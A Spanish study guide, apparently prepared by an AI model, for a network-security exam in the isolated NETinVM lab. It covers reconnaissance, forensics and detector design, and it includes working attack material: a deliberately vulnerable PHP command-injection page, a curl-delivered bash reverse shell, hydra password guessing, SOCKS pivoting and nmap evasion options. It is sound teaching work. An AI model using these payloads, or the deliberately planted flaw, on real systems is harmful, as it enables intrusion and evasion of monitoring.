# Guía completa — Parcial NETinVM (Ciberseguridad en Redes)

> **Cómo usar esta guía.** Está pensada para que la ejecutes tú, de arriba a abajo. Cada
> parte tiene: (1) *qué* haces y *por qué*, (2) los *comandos exactos* y (3) *qué evidencia
> capturar* para el informe. Todo ocurre **dentro de NETinVM** (un laboratorio aislado que
> corre en tu propia VM): los "ataques" van contra máquinas del propio laboratorio, que es
> justo su propósito didáctico. No apuntes ninguna herramienta a hosts reales de internet.
>
> **Marca de progreso sugerida para hoy:** Parte A (montaje) → Parte B (Punto 0) → Parte C
> (Punto 1). Las Partes D–G (Puntos 2–5) quedan documentadas para que sigas después.

---

## 0. Mapa mental de NETinVM (léelo una vez)

NETinVM es **una sola VM** (la llamamos *base*, Debian 12) que, por dentro, levanta varias
mini-VMs con KVM y las conecta en tres redes separadas por un cortafuegos:

```
                 ┌─────────────────────── VM "base" (Debian 12) ───────────────────────┐
                 │                                                                      │
   INTERNET ──►  │   EXT (10.5.0.0/24)      DMZ (10.5.1.0/24)      INT (10.5.2.0/24)    │
   (NAT)         │   exta 10.5.0.10          dmza 10.5.1.10         inta 10.5.2.10       │
                 │   extb 10.5.0.11          dmzb 10.5.1.11         intb 10.5.2.11       │
                 │     ...                     ...                    ...                │
                 │        \                    |  (fw .254)         /                    │
                 │         └──────────────►  [ fw ]  ◄────────────┘                      │
                 │   base = .1 en cada red · fw = .254 en cada red                       │
                 └──────────────────────────────────────────────────────────────────────┘
```

**Direccionamiento (memorízalo, lo usarás todo el tiempo):** `10.5.<RED>.<MÁQUINA>`
- `<RED>`: **0 = ext**, **1 = dmz**, **2 = int**  · máscara /24
- `<MÁQUINA>`: **10 = a**, 11 = b, 12 = c … 15 = f
- **fw = .254** en cada red · **base = .1** en cada red

Por lo tanto:

| Máquina | IP | Rol / servicio por defecto |
|---|---|---|
| `exta` | 10.5.0.10 | Equipo atacante en EXT (Internet) |
| `dmza` | 10.5.1.10 | `www.example.net` — HTTP/HTTPS (Apache) |
| `dmzb` | 10.5.1.11 | `ftp.example.net` — FTP |
| `inta` | 10.5.2.10 | Servidor interno — SSH |
| `fw`   | .254 en cada red | Cortafuegos / router entre zonas |

**Credenciales (todas las máquinas):** usuario `user1`, contraseña `You can change me.`
(con el punto final). `root` usa la misma contraseña. `user1` tiene `sudo`.

**Comandos clave de NETinVM (se ejecutan en `base` como `user1`):**
- `netinvm_run_all` → arranca los switches virtuales + `fw`, `exta`, `inta`, `dmza`.
- `netinvm_run dmzb` → arranca una máquina adicional (aquí, el FTP). Igual para `extb`, `intb`, etc.
- Atajos gráficos en la carpeta *KVM machines* del escritorio: **Run all**, **Shutdown all**,
  **Configure my machines** + **Run my machines**.
- Consola de una máquina: cada una abre en su **propio escritorio KDE** (usa el paginador de
  escritorios), o desde una terminal de `base`: `virt-viewer --attach exta`.
- Trabajar dentro de una máquina por SSH (el SSH base→máquina **funciona siempre**, sin importar
  el filtrado del fw): `ssh user1@exta` (o `ssh user1@10.5.0.10`).

---

# PARTE A — Montaje del entorno (VirtualBox)

## A1. Verificaciones previas (5 min)

NETinVM usa **virtualización anidada** (KVM dentro de tu VM). Necesitas que tu CPU exponga
VT-x/AMD-V a la VM. Como ya corres Kali/Metasploitable en VirtualBox de forma nativa, casi
seguro **Hyper-V está desactivado y VT-x activo**, que es justo lo que hace falta. Verifica:

1. **Virtualización activa en el host.** Abre el Administrador de tareas → pestaña *Rendimiento*
   → CPU → mira "Virtualización: **Habilitada**".
2. **Hyper-V/seguridad basada en virtualización desactivados** (si estuvieran activos, VirtualBox
   no puede anidar VT-x). En PowerShell:
   ```powershell
   systeminfo | findstr /i "Hyper-V"
   ```
   Si dice *"Se detectó un hipervisor. No se mostrarán las características requeridas para Hyper-V"*
   → Hyper-V ESTÁ activo y hay que apagarlo. Para apagarlo (requiere reinicio):
   ```powershell
   bcdedit /set hypervisorlaunchtype off
   ```
   Y desactiva *Aislamiento del núcleo → Integridad de memoria* en Seguridad de Windows.
   (Si tus VMs de VirtualBox ya arrancan bien, probablemente NO necesitas tocar nada de esto.)
3. **Recursos:** darás **6–8 GB de RAM** y **2–4 vCPU** a NETinVM. Ten al menos ~20 GB de disco
   libres para la imagen + el disco extraído.

## A2. Descargar NETinVM (y verificar integridad)

Imagen oficial (VMware, del 22-jul-2025):
```
https://informatica.uv.es/~carlos/ns/netinvm/netinvm_2025-07-22_vmware.zip
```
- **Tamaño:** 4.4 GB · **SHA256:** `7db6cba4b77199dfbcffd1891ee161c7809dd90dbf20dda03870e3e2e5891338`

> **Nota:** de nuestro intento quedó un archivo parcial (~1 GB) en
> `C:\Users\pipel\Downloads\netinvm\netinvm_vmware.zip`. Puedes **reanudarlo** o borrarlo y
> empezar de cero.

Descarga por PowerShell (`curl.exe` viene en Windows 10/11 y soporta reanudar con `-C -`):
```powershell
cd $env:USERPROFILE\Downloads\netinvm            # crea la carpeta si no existe
curl.exe -L -C - -o netinvm_vmware.zip "https://informatica.uv.es/~carlos/ns/netinvm/netinvm_2025-07-22_vmware.zip"
```
(o simplemente pega la URL en el navegador). Al terminar, verifica el hash:
```powershell
certutil -hashfile netinvm_vmware.zip SHA256
```
Debe coincidir con el SHA256 de arriba. Si no coincide, la descarga se corrompió → repítela.

## A3. Extraer la imagen

Descomprime el `.zip` (clic derecho → *Extraer* con WinRAR/7-Zip, que ya tienes; evita el
extractor nativo con archivos grandes). Quedará una carpeta con estos archivos típicos:
- un archivo `.vmx` (config de VMware — **no** lo usaremos, es solo referencia),
- uno o varios `.vmdk` (**el disco duro virtual** — esto es lo que importa).

En tu caso el disco es **un solo archivo de ~13.5 GB** (no está partido). Ruta exacta:
`C:\Users\pipel\Downloads\netinvm\netinvm_vmware\netinvm_2025-07-22\netinvm_2025-07-22.vmdk`
Ese es el `.vmdk` que vas a adjuntar en A5.

## A4. Crear la VM en VirtualBox

1. VirtualBox → **Nueva**.
2. **Name:** `NETinVM` · **Type/OS:** *Linux* · **Version:** *Debian (64-bit)*.
   (No marques "instalación desatendida".)
3. **Hardware:** Memoria **6144–8192 MB**, **2–4 CPU**.
4. **Disco duro:** elige **"No añadir disco virtual por ahora"** (lo adjuntamos en el paso A5,
   apuntando al `.vmdk` extraído). Termina el asistente.

> Si ya empezaste este asistente antes, puedes continuarlo o cancelarlo y rehacerlo; da igual.

## A5. Configurar la VM (lo crítico: anidación, disco y red)

Selecciona `NETinVM` → **Configuración**:

**a) Adjuntar el disco `.vmdk` COMO DISCO DURO.** *Almacenamiento* → selecciona el controlador
**SATA** (si no hay, botón "Añadir controlador" → SATA) → con el controlador SATA seleccionado,
clic en el icono **+ de disco duro** ("Añade disco duro", NO el de CD/óptico) → *Add / Añadir* →
navega y elige:
`C:\Users\pipel\Downloads\netinvm\netinvm_vmware\netinvm_2025-07-22\netinvm_2025-07-22.vmdk`
→ *Choose / Elegir*. Debe quedar colgando del controlador SATA como disco duro (no como CD).

**b) Activar virtualización anidada.** *Sistema* → pestaña **Procesador** → marca
**"Habilitar VT-x/AMD-V anidada"**. En la pestaña *Placa base*, deja **IO-APIC habilitado**.

> Si la casilla de anidada aparece **en gris**, tu host tiene Hyper-V/VBS activo (vuelve a A1).
> Como alternativa por línea de comandos (VM apagada):
> ```powershell
> & "C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" modifyvm "NETinVM" --nested-hw-virt on
> ```

**c) Red.** *Red* → **Adaptador 1 = NAT** (le da internet a `base`; las tres redes del
laboratorio son internas a la VM, así que con un adaptador basta).
*Opcional:* Adaptador 2 = *Solo-anfitrión* si quieres hacer SSH desde Windows a `base`.

**d) Orden de arranque.** *Sistema* → pestaña **Placa base** → en *Orden de arranque* marca
**Disco duro** y súbelo al primer lugar (puedes desmarcar *Disquete*). Deja el firmware en
**BIOS** (NO marques EFI: esta imagen arranca por BIOS).

**e) Aceptar.**

> **Si al iniciar sale `No bootable medium found` / "falló al iniciar, monte un DVD":** es
> exactamente este paso. Significa que la VM no tiene un disco duro de arranque. Apaga la VM
> (Máquina → Apagar), vuelve a *Almacenamiento* y verifica que el `.vmdk` está adjunto **como
> disco duro** bajo el controlador SATA (a), y que en *Placa base* está marcado **Disco duro**
> en el orden de arranque (d). NO montes ningún DVD/ISO: NETinVM ya trae el sistema en el `.vmdk`.

## A6. Primer arranque y verificación

1. **Iniciar** la VM. Debe arrancar Debian 12 y entrar al escritorio KDE (login `user1` /
   `You can change me.`).
2. Abre una terminal en `base` y levanta la red del laboratorio:
   ```bash
   netinvm_run_all
   ```
   Verás abrirse las consolas de `fw`, `exta`, `inta`, `dmza` (cada una en su escritorio KDE).
   Arranca también el FTP para tener otro objetivo:
   ```bash
   netinvm_run dmzb
   ```
3. **Verifica las tres zonas.** Entra a `exta` (paginador KDE o `ssh user1@exta` desde `base`) y:
   ```bash
   ping -c1 dmza      # 10.5.1.10  → debe responder (servicio publicado)
   ping -c1 inta      # 10.5.2.10  → probablemente NO (fw corta EXT→INT)
   ip a               # confirma que exta está en 10.5.0.10/24
   ```
   Si `dmza` responde y ves la IP correcta, **el montaje está listo.** 

**Evidencia (Punto base / montaje):** captura de VirtualBox con la casilla de anidación marcada,
y captura de las consolas de las máquinas arrancadas + el `ip a`/`ping` desde `exta`.

---

# PARTE B — Punto 0: Ejercicios base de NETinVM

Son los dos ejercicios oficiales. **Entregable:** evidencias de ambos + una conclusión corta.

## B1. Ejercicio 1 — Captura de una sesión HTTP con Wireshark

*Idea:* generar tráfico HTTP desde `exta` hacia el web `dmza` y capturarlo en la máquina `base`,
que tiene **puertos espejo** de cada red (`mirror-ext`, `mirror-dmz`, `mirror-int`).

1. En **`base`**, abre **Wireshark** y pon a capturar en la interfaz **`mirror-dmz`**
   (o por consola: `sudo tcpdump -i mirror-dmz -w /tmp/http.pcap`).
2. En **`exta`** (como root), genera la petición:
   ```bash
   sudo wget http://www.example.net
   ```
3. Vuelve a Wireshark en `base`, **detén la captura** y filtra:
   ```
   http
   ```
   Verás la sesión completa: `GET / HTTP/1.1` desde 10.5.0.10 hacia 10.5.1.10, la respuesta
   `200 OK` del Apache, y el three-way handshake TCP previo.

**Evidencia:** captura de Wireshark mostrando el `GET` y el `200 OK` (idealmente con
*Follow → HTTP Stream*), señalando IPs origen/destino.

## B2. Ejercicio 2 — Escaneo de puertos con Nmap

Todo en **`exta`** como root. Verifica primero conectividad:
```bash
ping -c1 dmza
```

```bash
# 1) Escaneo básico (los ~1000 puertos comunes)
sudo nmap www.example.net
#   Esperado: 80/tcp open http, 443/tcp closed https, el resto "filtered".

# 2) Todos los puertos TCP (tarda ~1-2 min)
sudo nmap -p 0-65535 www.example.net
#   Esperado: solo 80 y 443 visibles → el fw filtra todo lo demás hacia la DMZ.

# 3) Detección de sistema operativo
sudo nmap -O -p 80,443 www.example.net
#   Esperado: adivina Linux (kernel 2.6.x–3.x aprox.).

# 4) Versión del servicio
sudo nmap -sV -p 80 www.example.net
#   Esperado: 80/tcp open http  Apache httpd 2.4.x ((Debian)).
```
Experimentos extra que el propio ejercicio sugiere (para comentar comportamiento del fw):
```bash
sudo nmap -sn 10.5.1.0/24                 # descubrimiento de hosts en la DMZ
sudo nmap -sA -p 80,81 10.5.1.10          # ACK scan: ¿stateful el fw?
sudo nmap -n -Pn -sW -p 80,81 10.5.1.10   # Window scan
sudo nmap -n -Pn -sX -p 80,81 10.5.1.10   # Xmas scan
```

**Evidencia:** capturas de cada salida. **Conclusión (redacta 5–8 líneas):** el fw solo publica
80/443 de `dmza`; 443 aparece *closed* (llega al host pero no hay HTTPS) mientras el resto sale
*filtered* (lo corta el fw); el `-sV` revela Apache 2.4.x sobre Debian. Comenta la diferencia
*closed* vs *filtered* como huella del cortafuegos con estado.

---

# PARTE C — Punto 1: Reconstrucción de la superficie de ataque

**Objetivo:** desde EXT (`exta`), reconstruir toda la infraestructura visible: hosts, puertos,
servicios, versiones y rutas. **Entregable:** mapa de red + evidencias + matriz activos/riesgos.

Trabaja en `exta` como root. Guarda **todo** en archivos (te sirven de evidencia):

```bash
mkdir -p ~/recon && cd ~/recon

# 1) ¿Qué redes veo? Descubrimiento de hosts por zona
sudo nmap -sn 10.5.0.0/24 -oA disc_ext     # mi propia red EXT
sudo nmap -sn 10.5.1.0/24 -oA disc_dmz     # DMZ (deberían verse hosts publicados)
sudo nmap -sn 10.5.2.0/24 -oA disc_int     # INT (esperado: nada → fw bloquea EXT→INT)

# 2) Escaneo completo de servicios sobre lo que SÍ responde (la DMZ)
sudo nmap -Pn -p- -sV -sC -T4 10.5.1.10 -oA dmza_full   # web
sudo nmap -Pn -p- -sV -sC -T4 10.5.1.11 -oA dmzb_full   # ftp (si arrancaste dmzb)

# 3) Confirmar que INT es inalcanzable desde EXT (evidencia de segmentación)
sudo nmap -Pn -p 22,80,443 10.5.2.10 -oA int_blocked

# 4) Traza de rutas hacia cada zona (para el mapa)
traceroute -n 10.5.1.10
traceroute -n 10.5.2.10
```

Con eso obtienes: hosts vivos por red, puertos/servicios/versiones de la DMZ, y la evidencia de
que la INT está filtrada. Los archivos `.nmap/.gnmap/.xml` (`-oA`) son tu respaldo.

**Mapa de red:** dibújalo con la topología de la sección 0, marcando en cada host los puertos
abiertos y versiones que encontraste (puedes usar draw.io / diagrams.net).

**Matriz de activos/riesgos** (tabla para el informe), una fila por servicio expuesto:

| Activo | IP | Puerto/Servicio | Versión | Exposición | Riesgo | Justificación |
|---|---|---|---|---|---|---|
| dmza (www) | 10.5.1.10 | 80/HTTP | Apache 2.4.x | Desde EXT | Alto | Única superficie web publicada; punto de entrada probable |
| dmza (www) | 10.5.1.10 | 443/HTTPS | — | Desde EXT | Medio | Puerto reenviado por fw, sin servicio (closed) |
| dmzb (ftp) | 10.5.1.11 | 21/FTP | vsftpd/…​ | Desde EXT | Medio-Alto | FTP expuesto; revisar credenciales/anónimo |
| inta | 10.5.2.10 | 22/SSH | — | **No** desde EXT | Bajo (desde EXT) | Protegido por el fw; solo alcanzable desde INT/DMZ |

> **La mayor superficie de ataque** es la **DMZ** (lo único publicado hacia el exterior), y dentro
> de ella el **servicio web de `dmza`** (y el FTP de `dmzb`). Ese es el objetivo del Punto 2.

---

# PARTE D — Punto 2: Compromiso controlado de la DMZ

**Realidad importante:** las máquinas de NETinVM corren Debian **parcheado**, así que Apache/FTP
"de fábrica" no tienen un CVE trivial explotable como en Metasploitable. Para hacer el ejercicio
de forma realista y reproducible, se **despliega a propósito una vulnerabilidad** en la DMZ y se
explota. → **Confirma con el profesor** si esperan (a) que montes tú un servicio vulnerable, o
(b) un objetivo concreto que él preparó. Abajo van las dos rutas.

### Ruta A (recomendada): app web vulnerable en `dmza` → shell

**Preparar el objetivo** (una sola vez, en `dmza`; simula un desarrollador que subió código
inseguro). Instala DVWA o un script PHP con *command injection*:

```bash
# En dmza (como root):
sudo apt update && sudo apt install -y apache2 php libapache2-mod-php
# Página deliberadamente vulnerable a inyección de comandos:
sudo tee /var/www/html/ping.php >/dev/null <<'PHP'
<?php $ip=$_GET['ip']; if($ip){ echo "<pre>"; system("ping -c1 ".$ip); echo "</pre>"; } ?>
<form>IP: <input name="ip"><input type="submit"></form>
PHP
sudo systemctl restart apache2
```

**Explotar desde `exta`** (así el tráfico cruza el fw EXT→DMZ, como un atacante externo):

```bash
# 1) Confirmar la vulnerabilidad (inyección con ';')
curl "http://www.example.net/ping.php?ip=127.0.0.1;id"
#    Si en la respuesta aparece 'uid=33(www-data)…' → RCE confirmada.

# 2) Poner un listener en exta
nc -lvnp 4444        # en una terminal de exta

# 3) Lanzar una reverse shell desde la web vulnerable (en otra terminal de exta)
curl "http://www.example.net/ping.php?ip=127.0.0.1;bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.5.0.10/4444%200>%261'"
```
En el listener obtendrás una shell en `dmza`. Prueba de compromiso:
```bash
id; hostname; ip a; cat /etc/os-release
```

### Ruta B (alternativa): credenciales débiles en el FTP de `dmzb`

Si el FTP publica el usuario por defecto, se puede romper por diccionario desde `exta`:
```bash
# Usuarios/claves candidatas (incluye la default de NETinVM)
printf 'user1\n' > users.txt
printf 'You can change me.\npassword\nadmin\n123456\n' > pass.txt
hydra -L users.txt -P pass.txt ftp://10.5.1.11
# Con credenciales válidas:
ftp 10.5.1.11
```

**Entregable Punto 2:** vulnerabilidad identificada (tipo, dónde), metodología de explotación
(los comandos), **evidencia del acceso** (captura del `id`/`hostname` en `dmza`) y **análisis de
impacto** (tienes ejecución de comandos como `www-data` en la DMZ: lectura de ficheros del
servidor, punto de apoyo para pivotar a INT → Punto 3).

---

# PARTE E — Punto 3: Pivoting y movimiento lateral hacia INT

**Objetivo:** desde `dmza` (ya comprometida), ver si puedes alcanzar la red INT (10.5.2.0/24) y
analizar qué te lo permite o impide. **Entregable:** diagrama de la ruta + evidencias + análisis
del fw.

**1) Reconocer INT desde el punto de apoyo (dmza).** En la shell que tienes en `dmza`:
```bash
# ¿Veo la red interna desde la DMZ?
for h in 10.5.2.10 10.5.2.11 10.5.2.254; do ping -c1 -W1 $h; done
# Si dmza no tiene nmap, escaneo "a mano" de puertos con bash:
for p in 22 80 445 3306; do (echo >/dev/tcp/10.5.2.10/$p) >/dev/null 2>&1 && echo "10.5.2.10:$p abierto"; done
```

**2) Leer las reglas reales del cortafuegos** (para explicar el resultado). Entra a `fw`
(desde `base`: `ssh user1@fw` o su consola) y:
```bash
sudo iptables -L -n -v            # políticas y reglas por defecto
sudo iptables -t nat -L -n -v     # NAT/redirecciones
sudo nft list ruleset 2>/dev/null # por si usa nftables
ls /root /etc/netinvm 2>/dev/null # scripts de configuración del fw de NETinVM
```
Busca reglas que involucren `dmz`→`int`. **Lo esperado por diseño DMZ:** la DMZ **no** puede
iniciar conexiones hacia INT (una DMZ comprometida no debe alcanzar la red interna). Si ese es
el caso, tu hallazgo es "la segmentación funciona y bloquea el pivoting".

**3) Si existe alguna ruta permitida** (p. ej. un puerto concreto DMZ→INT), pivota a través de
`dmza`. Desde `exta`, usando la shell de `dmza` como salto:
```bash
# Túnel SOCKS a través de dmza (si tienes credenciales SSH del punto de apoyo)
ssh -D 1080 -N user1@www.example.net
# y luego escaneas INT "a través" del túnel:
proxychains nmap -Pn -sT -p 22 10.5.2.10
# Alternativa portable si no hay ssh entrante: subir 'chisel' a dmza y crear un túnel inverso.
```

**Análisis (redáctalo):** qué reglas del fw viste, por qué la INT es (in)alcanzable desde la DMZ,
y qué habría que cambiar en el fw para permitir o endurecer ese camino. Incluye el **diagrama**
EXT → (web) → dmza → (¿fw?) → inta.

---

# PARTE F — Punto 4: Reconstrucción forense de un ataque

**Objetivo:** a partir de una captura de tráfico + logs, reconstruir cronológicamente el ataque.
**Entregable:** línea de tiempo + IoCs + evidencias + conclusión forense.

> **Confirma con el profesor** si te entrega un `.pcap` propio. Si no, la vía natural es
> **capturar tu propio ataque** de las Partes B–E en la máquina `base` (que tiene los puertos
> espejo), y luego analizarlo "como si fueras el analista".

**1) Capturar mientras repites el ataque** (en `base`, una terminal por interfaz):
```bash
sudo tcpdump -i mirror-ext -w ~/caso_ext.pcap
sudo tcpdump -i mirror-dmz -w ~/caso_dmz.pcap
```
(Repite ahora, de forma limpia, el recon del Punto 1 + la explotación del Punto 2.)

**2) Analizar la captura** con Wireshark o `tshark` en `base`:
```bash
# Panorama de conversaciones
tshark -r ~/caso_dmz.pcap -q -z conv,tcp
# Reconstruir el HTTP malicioso (la inyección)
tshark -r ~/caso_dmz.pcap -Y 'http.request' -T fields -e frame.time -e ip.src -e http.request.full_uri
# Localizar la reverse shell (conexiones salientes al 4444)
tshark -r ~/caso_dmz.pcap -Y 'tcp.port==4444'
```

**3) Correlacionar con logs** (en `dmza` y `fw`):
```bash
# En dmza:
sudo tail -n 50 /var/log/apache2/access.log     # verás el GET a ping.php con ';id'
sudo grep -i ping.php /var/log/apache2/access.log
# En fw:
sudo grep -i drop /var/log/kern.log 2>/dev/null  # paquetes bloqueados (si el fw loguea)
```

**4) Construir la línea de tiempo** (tabla): timestamp → fase → evidencia. Fases:
*reconocimiento* (barrido nmap: muchos SYN desde 10.5.0.10), *acceso inicial* (GET a `ping.php`
con `;id`), *explotación* (reverse shell a 10.5.0.10:4444), *movimiento lateral* (intentos
DMZ→INT). **IoCs:** IP atacante `10.5.0.10`, patrón de URL `ping.php?ip=...;`, puerto `4444`,
user-agent de `curl`/`nmap`, ráfaga de SYN a puertos secuenciales.

---

# PARTE G — Punto 5: Evasión de un mecanismo de detección

**Objetivo:** diseñar un detector de reconocimiento y luego probar técnicas de escaneo que
intenten evadirlo. **Entregable:** el mecanismo, resultados de experimentos, tasas de
detección/falsos positivos, y una propuesta de mejora.

**1) Diseñar el detector** en `base` (que ve todo por `mirror-ext`). Dos opciones:

*Opción sencilla (script propio) — detecta "muchos puertos distintos desde una misma IP":*
```bash
sudo tee ~/scan_detect.sh >/dev/null <<'SH'
#!/bin/bash
# Alerta si una IP toca > UMBRAL puertos distintos en la ventana de captura
IFACE=mirror-ext; UMBRAL=15
sudo timeout 60 tcpdump -i $IFACE -nn 'tcp[tcpflags] & tcp-syn != 0' 2>/dev/null \
 | awk '{print $3}' | sed -E 's/\.[0-9]+$//' \
 | sort | uniq -c | sort -rn \
 | awk -v u=$UMBRAL '$1>u{print "[ALERTA] posible escaneo desde", $2, "(", $1, "SYN)"}'
SH
chmod +x ~/scan_detect.sh
```
*Opción robusta (IDS):* instala **Snort** o **Suricata** en `base` escuchando `mirror-ext` con la
regla `sfportscan` (Snort) o el módulo de detección de escaneos. Documenta la regla que usas.

**2) Ejecutar escaneos variando parámetros** (desde `exta`, mientras el detector corre en `base`):
```bash
sudo nmap -T4 -p1-1000 10.5.1.10              # (control) rápido → debería detectarse
sudo nmap -T1 -p1-1000 10.5.1.10              # lento
sudo nmap -T0 --scan-delay 15s -p1-200 10.5.1.10   # muy lento/distribuido en el tiempo
sudo nmap --max-parallelism 1 -p1-1000 10.5.1.10   # una conexión a la vez
sudo nmap -D RND:10 -p1-1000 10.5.1.10        # señuelos (oculta tu IP entre falsas)
sudo nmap -f -p1-1000 10.5.1.10               # fragmentación
sudo nmap --source-port 53 -p1-1000 10.5.1.10 # puerto origen "confiable"
```

**3) Medir.** Para cada técnica anota: ¿saltó la alerta? (detección) y ¿alertó con tráfico
legítimo? (falso positivo). Arma la tabla:

| Técnica | ¿Detectado? | Tiempo | Notas |
|---|---|---|---|
| `-T4` (control) | Sí | ~seg | ráfaga clara de SYN |
| `-T1` | ¿? | ~min | |
| `-T0 --scan-delay` | Probable NO | mucho | cae bajo el umbral por ventana |
| `--max-parallelism 1` | ¿? | | |
| `-D RND:10` | Sí, pero IP oculta | | detecta el escaneo, no al autor |
| `-f` | depende | | fragmentación |

**Propuesta de mejora:** el detector por umbral/ventana se evade con escaneos lentos → mejora con
**ventanas deslizantes largas + memoria de estado por IP**, correlación de intentos a lo largo de
horas, o detección por **entropía de puertos** en vez de conteo. Menciona el compromiso
detección↔falsos positivos.

---

# PARTE H — Armado del informe (PDF)

Estructura sugerida (un capítulo por punto):

1. **Portada** (materia, parcial, tu nombre, fecha) e **índice**.
2. **Entorno**: breve descripción de NETinVM, topología (el diagrama de la sección 0) y montaje.
3. **Punto 0**: evidencias de los dos ejercicios + conclusión.
4. **Punto 1**: mapa de red + matriz de activos/riesgos + evidencias de nmap.
5. **Punto 2**: vulnerabilidad, metodología, evidencia de acceso, impacto.
6. **Punto 3**: diagrama de la ruta, evidencias, análisis del fw.
7. **Punto 4**: línea de tiempo, IoCs, evidencias, conclusión forense.
8. **Punto 5**: mecanismo, tabla de resultados, tasas, propuesta de mejora.
9. **Conclusiones generales**.

Para generar el PDF: escribe el informe en Word/Markdown y exporta a PDF, o si quieres te lo
armo yo a partir de tus capturas y notas (pásame las evidencias y lo ensamblo).

---

## Apéndice — trucos útiles

- **Sacar capturas/archivos de la VM a Windows:** lo más simple es tomar capturas de pantalla de
  las consolas. Para archivos (pcaps, salidas nmap): en *Configuración → Carpetas compartidas* de
  VirtualBox añade una carpeta de Windows y monta con Guest Additions; o desde `base`
  `scp user1@exta:~/recon/* .` para juntar todo en `base` primero.
- **Portapapeles/pantalla:** *Dispositivos → Portapapeles compartido → Bidireccional* facilita
  pegar comandos dentro de la VM.
- **Apagar limpio:** `netinvm` → *Shutdown all*, luego apaga la VM `base`.
- **Si algo no arranca:** revisa que la casilla de anidación quedó marcada (A5b) y que diste RAM
  suficiente; con poca RAM las máquinas KVM internas no levantan.

**Dos cosas por confirmar con el profesor antes de los Puntos 2 y 4:**
1. ¿Puedes desplegar tú un servicio vulnerable en la DMZ (Ruta A del Punto 2)?
2. El `.pcap` del Punto 4: ¿lo entrega él o lo generas capturando tu propio ataque?
